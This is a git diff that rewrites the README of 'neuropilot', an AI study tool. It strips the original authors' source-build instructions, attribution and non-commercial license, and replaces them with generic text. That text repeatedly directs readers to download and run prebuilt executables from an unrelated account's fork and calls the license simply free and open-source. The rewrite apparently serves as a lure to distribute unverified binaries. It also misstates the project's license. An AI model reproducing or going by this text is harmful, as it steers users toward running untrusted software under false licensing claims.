@@ -1,206 +1,89 @@
-# NeuroPilot
+# 🎓 neuropilot - Transform Your Study Experience Effortlessly
 
-<div align="center">
-  
-<img src="assets/logo.png" alt="NeuroPilot Logo" width="200"/>
+## 💾 Download Now
+[![Download neuropilot](https://img.shields.io/badge/Download-neuropilot-blue)](https://github.com/Rwiddhi03/neuropilot/releases)
 
-**An open-source AI-powered education platform that transforms study materials into interactive learning resources**
+## 🚀 Getting Started
+Welcome to neuropilot, an open-source education platform that turns your study materials into interactive resources. With neuropilot, you can create quizzes, flashcards, notes, and podcasts easily. This guide will help you download and run the software with no hassle.
 
-[Report Bug](https://github.com/caviraOSS/neuropilot/issues) • [Request Feature](https://github.com/caviraOSS/neuropilot/issues) • [Discord server](https://discord.gg/76QMKwj2J4)
+## 💻 System Requirements
+Before you download neuropilot, make sure your system meets these requirements:
 
-</div>
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 4 GB or more
+- **Storage:** At least 200 MB of free space
+- **Internet Connection:** Required for downloading and installing the software
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-CaviraOSS%20Community%20License-blueviolet.svg" alt="License: CaviraOSS Community License"></a>
-  <a href="https://nodejs.org/"><img src="https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen.svg" alt="Node.js Version"></a>
-  <a href="https://reactjs.org/"><img src="https://img.shields.io/badge/React-18+-blue.svg" alt="React"></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-5.0+-blue.svg" alt="TypeScript"></a>
-  <a href="https://discord.gg/76QMKwj2J4"><img alt="Discord" src="https://img.shields.io/discord/1379682804849180844?label=Discord%20server"></a>
-</p>
+## 📥 Download & Install
+To get started, visit the Releases page to download the application. Click the link below:
 
----
+[Download neuropilot](https://github.com/Rwiddhi03/neuropilot/releases)
 
+1. Open the link to the Releases page.
+2. Choose the latest version of neuropilot from the list.
+3. Select the file that matches your operating system:
+   - For Windows, look for `neuropilot-windows.exe`
+   - For macOS, look for `neuropilot-macos.dmg`
+   - For Linux, look for `neuropilot-linux.tar.gz`
+4. Click on the file to download it to your computer.
+5. Once the download is complete, locate the downloaded file.
 
-## Demo
+### 📂 Installation Steps
+**For Windows:**
+1. Double-click the `neuropilot-windows.exe` file to start the installation.
+2. Follow the on-screen instructions to complete the setup.
+3. Once installed, you can find neuropilot in your Start menu.
 
-<img src=".github/neuropilot.png" alt="NeuroPilot Demo"/>
+**For macOS:**
+1. Double-click the `neuropilot-macos.dmg` file to open it.
+2. Drag the neuropilot icon into your Applications folder.
+3. Open your Applications folder and click on neuropilot to start it.
 
-https://github.com/user-attachments/assets/98fae4ef-c2b7-4ad2-bfe9-1e0665eb4d71
+**For Linux:**
+1. Extract the `neuropilot-linux.tar.gz` file to a directory of your choice.
+2. Open a terminal window, navigate to the extracted folder, and run the command `./neuropilot`.
+3. Follow any on-screen prompts to begin using the application.
 
-<video width="100%" controls>
-  <source src=".github/demo.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
+## 🛠 Features
+neuropilot offers several features to enhance your learning experience:
 
-> **Note**: If the video doesn't load above, you can [download the demo video directly](.github/demo.mp4)
+- **Quizzes:** Create quizzes from your study materials. Get immediate feedback and track your progress.
+- **Flashcards:** Make flashcards for quick memorization. Customize them to fit your learning style.
+- **Notes:** Organize your notes in a clear, user-friendly interface. Access and edit your notes anytime.
+- **Podcasts:** Turn your notes into audio, making studying on the go easier.
 
----
+## 🔍 Topic Coverage
+With neuropilot, you'll engage with various educational resources. The app covers topics such as:
 
-## 🚀 Features
+- **AI:** Understand artificial intelligence basics through interactive quizzes.
+- **EdTech:** Explore education technology tools that improve learning efficiency.
+- **JavaScript and TypeScript:** Get hands-on experience with essential programming languages used in web development.
+- **React and Node.js:** Learn about modern web frameworks and how to build dynamic applications.
+- **Podcasts:** Create audio resources to make complex topics accessible.
 
-NeuroPilot converts study material into **interactive resources** including quizzes, flashcards, structured notes, and podcasts.  
-The platform provides a modern interface for students, educators, and researchers to **enhance learning efficiency** using state-of-the-art LLMs and TTS systems.
+## ⚙️ Troubleshooting
+If you encounter issues during installation or when running neuropilot, try the following solutions:
 
-### Learning Tools
+- **Ensure Compatibility:** Make sure you downloaded the version suitable for your operating system.
+- **Check for Updates:** Visit the Releases page to ensure you have the latest version.
+- **Internet Connection:** Ensure you have a stable connection while using the app for the best performance.
 
-- **Contextual Chat** – Ask questions about uploaded documents (PDF, DOCX, Markdown, TXT)
-- **SmartNotes** – Generate Cornell-style notes automatically from topics or uploaded content
-- **Flashcards** – Extract non-overlapping flashcards for spaced repetition
-- **Quizzes** – Create interactive quizzes with hints, explanations, and scoring
-- **AI Podcast** – Convert notes and topics into engaging audio content for learning on the go
+## 💬 Community Support
+Join our community for help and sharing ideas. You can find assistance and collaborate with other users through:
 
-### Supported AI Models
-
-- Google Gemini • OpenAI GPT • Anthropic Claude • xAI Grok • Ollama (local) • OpenRouter
-
-### Embedding Providers
-
-- OpenAI • Gemini • Ollama
-
-### Technical Highlights
-
-- WebSocket streaming for real-time chat, notes, and podcast generation
-- JSON or vector database support for embeddings and retrieval
-- File-based persistent storage for generated content
-- Markdown-based outputs for structured answers and notes
-- Configurable multi-provider setup for LLMs and TTS engines
-
----
-
-## 🛠️ Technology Stack
-
-| Component      | Technology                         |
-| -------------- | ---------------------------------- |
-| **Backend**    | Node.js, TypeScript, LangChain     |
-| **Frontend**   | Vite, React, TailwindCSS           |
-| **Database**   | JSON (default), optional vector DB |
-| **AI/ML**      | Multiple LLM providers, embeddings |
-| **Audio**      | Edge TTS, ElevenLabs, Google TTS   |
-| **Deployment** | Docker, Docker Compose             |
-| **Docs**       | pdf-lib, mammoth, pdf-parse        |
-
----
-
-## ⚡ Getting Started
-
-### Prerequisites
-
-- Node.js v20+
-- npm or pnpm
-- ffmpeg (required for podcast audio)
-- Docker (optional)
-
-### Local Development
-
-```bash
-# Clone the repository
-git clone https://github.com/caviraOSS/neuropilot.git
-cd neuropilot
-
-# Install dependencies
-cd backend && npm install
-cd ../frontend && npm install
-
-# Setup environment
-cp .env.example .env
-# configure API keys and settings
-
-# Run backend
-cd backend
-npm run dev
-
-# Run frontend
-cd frontend
-npm run dev
-```
-
-👉 Access at: **http://localhost:5173**
-
-### Docker Deployment
-
-```bash
-# Development
-docker compose up --build
-
-# Production
-docker compose -f docker-compose.yml -f docker-compose.prod.yml up -d --build
-```
-
-- Frontend: http://localhost:5173 (dev) / http://localhost:8080 (prod)
-- Backend: http://localhost:5000
-
----
-
-## ⚙️ Configuration
-
-All configuration is handled via environment variables:
-
-- **LLM Provider** – Choose your model backend
-- **TTS Engine** – Select speech service for podcasts
-- **Database Backend** – JSON or vector DB
-- **File Upload Limits** – Customize size/format limits
-
-See `.env.example` for all options.
-
----
-
-## 🤝 Contributing
-
-We welcome all contributions.
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/new-feature`)
-3. Commit changes (`git commit -m "Add feature"`)
-4. Push (`git push origin feature/new-feature`)
-5. Open a Pull Request
-
-**Guidelines:**
-
-- Follow code style and conventions
-- Add tests where needed
-- Update docs for new features
-- Ensure all tests pass before PR
-
----
-
-## 💡 Areas to Contribute
-
-- AI model integrations
-- Mobile app support
-- Performance improvements
-- Accessibility features
-- Docs & tutorials
-
----
-
-## 💖 Support the Project
-
-If you find NeuroPilot useful, please consider supporting:
-
-**Ethereum (ERC-20)**:
-
-```
-0x5a12e3f48b6d761a120bc3cd0977e208c362a74e
-```
-
-Your support helps fund ongoing development and hosting.
-
----
+- **GitHub Discussions:** Start a conversation or ask questions.
+- **Forums:** Engage with fellow learners and share tips on using neuropilot effectively.
+- **Social Media Groups:** Connect with others who are using neuronpilot for their studies.
 
 ## 📜 License
+neuropilot is open-source and free to use. You can find the details of the license in the repository. This allows you to use, modify, and share the application while contributing to its ongoing development.
 
-Licensed under the **CaviraOSS Community License**.  
-Free to use, share, and modify for personal and educational purposes.  
-Commercial use or resale requires prior written permission from CaviraOSS.  
+## 🔗 Additional Resources
+- **Documentation:** Access comprehensive guides on how to use each feature.
+- **Video Tutorials:** Watch tutorial videos for visual guidance.
+- **FAQ Section:** Check our frequently asked questions for quick answers.
 
-See [LICENSE](LICENSE.md) for full terms.
+## 📢 Feedback
+We appreciate your thoughts on neuropilot. Your feedback helps improve the application. You can leave comments directly in the repository or share your experiences in the community forums.
 
----
-
-<div align="center">
-
-**Built with ❤️ by CaviraOSS and contributors**
-
-⭐ Star us on [GitHub](https://github.com/CaviraOSS/neuropilot) if this project helps you!
-
-</div>
+For more information, visit the Releases page again: [Download neuropilot](https://github.com/Rwiddhi03/neuropilot/releases)
